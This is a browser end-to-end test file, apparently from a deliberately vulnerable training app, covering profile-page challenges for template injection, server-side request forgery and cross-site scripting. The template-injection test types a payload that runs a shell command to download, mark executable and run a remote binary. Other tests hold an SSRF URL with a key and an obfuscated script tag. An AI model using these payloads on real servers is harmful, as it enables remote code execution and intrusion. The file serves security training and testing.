const config = require('config')
const utils = require('../../lib/utils')

describe('/profile', () => {
  let username, submitButton, url, setButton
  beforeEach(() => {
    browser.waitForAngularEnabled(false)
  })

  if (!utils.disableOnContainerEnv()) {
    describe('challenge "SSTi"', () => {
      protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })
      browser.get('/profile')

      xit('should be possible to inject arbitrary nodeJs commands in username', () => {
        browser.get('/profile')
        browser.waitForAngularEnabled(false)
        username = element(by.id('username'))
        submitButton = element(by.id('submit'))
        username.sendKeys('#{root.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware\')}')
        submitButton.click()
        browser.get('/')
        browser.driver.sleep(5000)
      })
      protractor.expect.challengeSolved({ challenge: 'SSTi' })
    })
  }

  describe('challenge "SSRF"', () => {
    // protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})
    // browser.get('/profile')

    xit('should be possible to request internal resources using image upload URL', () => {
      browser.get('/profile')
      browser.waitForAngularEnabled(false)
      url = element(by.id('url'))
      submitButton = element(by.id('submitUrl'))
      url.sendKeys('http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
      submitButton.click()
      browser.get('/')
      browser.driver.sleep(5000)
    })
    // protractor.expect.challengeSolved({ challenge: 'SSRF' })
  })

  describe('challenge "Username XSS"', () => {
    // protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

    xit('Username field should be susceptible to XSS attacks', () => {
      const EC = protractor.ExpectedConditions
      browser.get('/profile')
      browser.waitForAngularEnabled(false)
      username = element(by.id('username'))
      setButton = element(by.id('submit'))
      username.sendKeys('<scr  ipt>alert(`xss`)</scr  ipt>')
      setButton.click()
      browser.wait(EC.alertIsPresent(), 5000, "'xss' alert is not present")
      browser.switchTo().alert().then(alert => {
        expect(alert.getText()).toEqual('xss')
        alert.accept()
      })
      browser.driver.sleep(5000)
    })
    // protractor.expect.challengeSolved({ challenge: 'Username XSS' })
  })
})
